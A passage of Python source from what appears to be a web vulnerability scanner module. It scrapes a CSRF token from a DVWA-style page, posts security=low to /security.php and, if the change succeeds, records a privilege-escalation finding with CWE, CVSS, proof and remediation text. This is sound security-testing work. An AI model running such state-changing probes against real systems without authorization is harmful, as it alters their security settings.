            token_match = _re.search(
                r'name=["\']user_token["\'][^>]+value=["\']([^"\']+)["\']',
                resp.text, _re.IGNORECASE
            )
            token = token_match.group(1) if token_match else ""

            change_resp = self.http.post(security_url, data={
                "security": "low",
                "seclev_submit": "Submit",
                "user_token": token,
            })

            if change_resp and "security level has been set" in change_resp.text.lower():
                finding = Finding(
                    title="Vertical Privilege Escalation — Security Level Change Without Re-Auth",
                    vulnerability_type="Vertical Privilege Escalation",
                    owasp_category="A01",
                    owasp_name="Broken Access Control",
                    cwe_id="CWE-269",
                    severity="High",
                    cvss_score=7.3,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N",
                    url=security_url,
                    method="POST",
                    parameter="security",
                    payload="security=low",
                    description=(
                        "An authenticated user can change the application security level "
                        "at /security.php without requiring admin re-authentication or "
                        "additional verification. This represents vertical privilege escalation."
                    ),
                    proof="POST /security.php with security=low succeeded without admin challenge.",
                    request_snippet=self.build_request_snippet("POST", security_url,
                        data={"security": "low", "seclev_submit": "Submit"}),
                    response_snippet=self.truncate_response(change_resp.text),
                    remediation=(
                        "Require re-authentication (current password confirmation) "
                        "before allowing security-sensitive configuration changes. "
                        "Implement role-based access control (RBAC) for admin functions."
                    ),
                    references=[
                        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation",
                        "https://cwe.mitre.org/data/definitions/269.html",
                    ],
                    module=self.MODULE_NAME,
                    confidence="High",
                )
                self.add_finding(finding)

    # ============================================================
    #  Helpers
    # ============================================================

    def _looks_like_error(self, html: str) -> bool:
        error_patterns = ["404 not found", "500 internal server error",
                          "access denied", "error", "exception"]
        lower = html.lower()
        return any(p in lower for p in error_patterns) and len(html) < 2000

    def _looks_like_login(self, html: str) -> bool:
        lower = html.lower()
        return ("login" in lower or "sign in" in lower) and len(html) < 5000